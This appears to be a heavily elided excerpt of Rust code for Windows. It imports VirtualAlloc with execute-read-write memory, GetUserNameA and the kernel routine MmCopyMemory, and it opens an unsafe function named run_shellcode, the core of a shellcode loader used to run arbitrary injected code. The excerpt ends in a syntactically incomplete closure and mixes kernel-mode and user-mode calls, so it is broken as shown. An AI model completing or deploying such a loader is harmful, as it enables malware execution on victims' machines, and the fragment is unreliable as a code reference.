...
use windows::Win32::System::Memory::{
    VirtualAlloc, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE,
};
use windows::Win32::System::WindowsProgramming::GetUserNameA;
use windows::Wdk::System::SystemServices::MmCopyMemory;
...
unsafe fn run_shellcode(shellcode: Vec<u8>) -> () {
    ...
    shellcode.iter().enumerate().map(|(index, byte)|)
